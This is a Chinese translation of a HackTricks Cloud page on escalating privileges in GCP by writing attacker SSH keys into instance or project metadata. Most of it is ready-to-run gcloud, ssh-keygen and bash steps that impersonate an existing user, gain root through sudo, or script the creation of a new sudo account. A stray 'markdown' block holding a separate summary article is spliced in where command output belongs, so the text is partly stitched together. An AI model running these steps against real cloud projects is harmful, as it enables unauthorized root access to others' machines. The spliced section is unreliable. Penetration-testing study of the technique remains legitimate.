# GCP - 添加自定义SSH元数据

<details>

<summary><strong>从零到英雄学习AWS黑客技术</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果您想在**HackTricks中看到您的公司广告**或**下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>

## 修改元数据 <a href="#modifying-the-metadata" id="modifying-the-metadata"></a>

如果您能够**修改实例的元数据**，有许多方法可以在本地提升权限。以下是几种可能导致服务账户具有此权限的情况：

_**默认服务账户**_\
如果服务账户访问**范围**设置为**完全访问**或至少明确允许**访问计算API**，那么这种配置就**容易受到**提升权限的**攻击**。**默认**的**范围**是**不容易受到攻击**的。

_**自定义服务账户**_\
使用自定义服务账户时，需要以下IAM权限之一来提升权限：

* `compute.instances.setMetadata`（影响单个实例）
* `compute.projects.setCommonInstanceMetadata`（影响项目中的所有实例）

尽管Google[建议](https://cloud.google.com/compute/docs/access/service-accounts#associating\_a\_service\_account\_to\_an\_instance)不要为自定义服务账户使用访问范围，但仍然可以这样做。您将需要以下**访问范围**之一：

* `https://www.googleapis.com/auth/compute`
* `https://www.googleapis.com/auth/cloud-platform`

### **向自定义元数据添加SSH密钥**

GCP上的**Linux** **系统**通常会运行[Python Linux Guest Environment for Google Compute Engine](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)脚本。其中之一是[账户守护进程](https://github.com/GoogleCloudPlatform/compute-image-packages/tree/master/packages/python-google-compute-engine#accounts)，它会**定期** **查询**实例元数据端点以获取**对授权的SSH公钥的更改**。

**如果遇到新的公钥**，它将被处理并**添加到本地机器**。根据密钥的格式，它将被添加到**现有用户的**`~/.ssh/authorized_keys`文件中，或者将**创建一个具有`sudo`权限的新用户**。

因此，如果您可以使用服务账户**修改自定义实例元数据**，您可以通过**获得对特权账户的SSH权限**来在本地系统上**提升**为root。如果您可以修改**自定义项目元数据**，您可以在当前GCP项目中运行账户守护进程的**任何系统上提升**为root。

### **向现有特权用户添加SSH密钥**

让我们从向现有账户添加我们自己的密钥开始，因为这可能会产生最小的干扰。

**检查实例中现有的SSH密钥**。选择其中一个用户，因为他们很可能拥有sudo权限。
```bash
gcloud compute instances describe [INSTANCE] --zone [ZONE]
```
```markdown
# GCP Compute Privilege Escalation via Custom SSH Metadata

在GCP中，Compute Engine实例可以通过SSH密钥的元数据来控制对实例的访问。如果您有权限修改项目或实例的元数据，您可以通过添加自己的SSH公钥来提升权限。

## Scenario

假设您已经获得了对GCP项目的有限访问权限。您可以查看实例，但没有直接通过SSH登录的权限。您的目标是提升权限，以便能够以任何用户身份登录到实例。

## Attack Steps

1. **添加SSH公钥到项目元数据** - 如果您有权限修改项目级别的元数据，您可以添加自己的SSH公钥。这将允许您以任何用户身份登录到所有接受项目级别元数据的实例。

2. **添加SSH公钥到实例元数据** - 如果您只能修改特定实例的元数据，您仍然可以添加您的SSH公钥。这将允许您以任何用户身份登录到该实例。

## Mitigation

防范此类提权攻击的最佳方法是限制谁可以修改SSH密钥元数据。确保只有可信的管理员拥有这些权限，并且对这些权限的使用进行监控和审计。

## Conclusion

通过向GCP项目或实例的元数据添加自己的SSH公钥，攻击者可以提升权限并获得对实例的访问。监控和限制对SSH密钥元数据的修改是防止此类攻击的关键。
```
```
...
metadata:
fingerprint: QCZfVTIlKgs=
items:
...
- key: ssh-keys
value: |-
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
...
```
注意公钥的**略微奇怪的格式** - **用户名**列在**开头**（后面跟着冒号），然后在**末尾**再次出现。我们需要匹配这种格式。与正常的SSH密钥操作不同，用户名绝对重要！

**将带有用户名和密钥的行保存在一个名为** `meta.txt` **的新文本文件中**。

假设我们的目标用户是上面的`alice`。我们将为自己**生成一个新密钥**，像这样：
```bash
ssh-keygen -t rsa -C "alice" -f ./key -P "" && cat ./key.pub
```
将您的新公钥添加到文件 `meta.txt` 中，模仿以下格式：
```
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC/SQup1eHdeP1qWQedaL64vc7j7hUUtMMvNALmiPfdVTAOIStPmBKx1eN5ozSySm5wFFsMNGXPp2ddlFQB5pYKYQHPwqRJp1CTPpwti+uPA6ZHcz3gJmyGsYNloT61DNdAuZybkpPlpHH0iMaurjhPk0wMQAMJUbWxhZ6TTTrxyDmS5BnO4AgrL2aK+peoZIwq5PLMmikRUyJSv0/cTX93PlQ4H+MtDHIvl9X2Al9JDXQ/Qhm+faui0AnS8usl2VcwLOw7aQRRUgyqbthg+jFAcjOtiuhaHJO9G1Jw8Cp0iy/NE8wT0/tj9smE1oTPhdI+TXMJdcwysgavMCE8FGzZ alice
bob:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2fNZlw22d3mIAcfRV24bmIrOUn8l9qgOGj1LQgOTBPLAVMDAbjrM/98SIa1NainYfPSK4oh/06s7xi5B8IzECrwqfwqX0Z3VbW9oQbnlaBz6AYwgGHE3Fdrbkg/Ew8SZAvvvZ3bCwv0i5s+vWM3ox5SIs7/W4vRQBUB4DIDPtj0nK1d1ibxCa59YA8GdpIf797M0CKQ85DIjOnOrlvJH/qUnZ9fbhaHzlo2aSVyE6/wRMgToZedmc6RzQG2byVxoyyLPovt1rAZOTTONg2f3vu62xVa/PIk4cEtCN3dTNYYf3NxMPRF6HCbknaM9ixmu3ImQ7+vG3M+g9fALhBmmF bob
alice:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDnthNXHxi31LX8PlsGdIF/wlWmI0fPzuMrv7Z6rqNNgDYOuOFTpM1Sx/vfvezJNY+bonAPhJGTRCwAwytXIcW6JoeX5NEJsvEVSAwB1scOSCEAMefl0FyIZ3ZtlcsQ++LpNszzErreckik3aR+7LsA2TCVBjdlPuxh4mvWBhsJAjYS7ojrEAtQsJ0mBSd20yHxZNuh7qqG0JTzJac7n8S5eDacFGWCxQwPnuINeGoacTQ+MWHlbsYbhxnumWRvRiEm7+WOg2vPgwVpMp4sgz0q5r7n/l7YClvh/qfVquQ6bFdpkVaZmkXoaO74Op2Sd7C+MBDITDNZPpXIlZOf4OLb alice
```
现在，您可以使用以下命令为您的实例**重写SSH密钥元数据**：
```bash
gcloud compute instances add-metadata [INSTANCE] --metadata-from-file ssh-keys=meta.txt
```
你现在可以按照以下方式**以`alice`的上下文访问shell**：
```
lowpriv@instance:~$ ssh -i ./key alice@localhost
alice@instance:~$ sudo id
uid=0(root) gid=0(root) groups=0(root)
```
### **创建一个新的特权用户并添加 SSH 密钥**

按照上述步骤没有找到现有的密钥？在 `/etc/passwd` 中没有其他有趣的目标用户？

您可以**遵循上述相同的过程**，但只需**编造一个新的用户名**。这个用户将会自动被创建，并被赋予 `sudo` 权限。脚本化的过程看起来是这样的：
```bash
# define the new account username
NEWUSER="definitelynotahacker"

# create a key
ssh-keygen -t rsa -C "$NEWUSER" -f ./key -P ""

# create the input meta file
NEWKEY="$(cat ./key.pub)"
echo "$NEWUSER:$NEWKEY" > ./meta.txt

# update the instance metadata
gcloud compute instances add-metadata [INSTANCE_NAME] --metadata-from-file ssh-keys=meta.txt

# ssh to the new account
ssh -i ./key "$NEWUSER"@localhost
```
### 项目级别的SSH密钥 <a href="#sshing-around" id="sshing-around"></a>

根据前一节中提到的细节，您可以尝试攻破更多的虚拟机。

我们可以通过[**在项目级别应用SSH密钥**](https://cloud.google.com/compute/docs/instances/adding-removing-ssh-keys#project-wide)，这样一来，只要实例没有明确选择“阻止项目范围内的SSH密钥”选项，您就可以获得权限，**SSH进入具有特权账户**。
```
gcloud compute project-info add-metadata --metadata-from-file ssh-keys=meta.txt
```
如果你足够大胆，你也可以直接输入 `gcloud compute ssh [INSTANCE]` 来使用你当前的用户名连接其他机器。

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>！</strong></summary>

其他支持HackTricks的方式：

* 如果你想在 **HackTricks中看到你的公司广告** 或者 **下载HackTricks的PDF版本**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方的PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来**分享你的黑客技巧**。

</details>
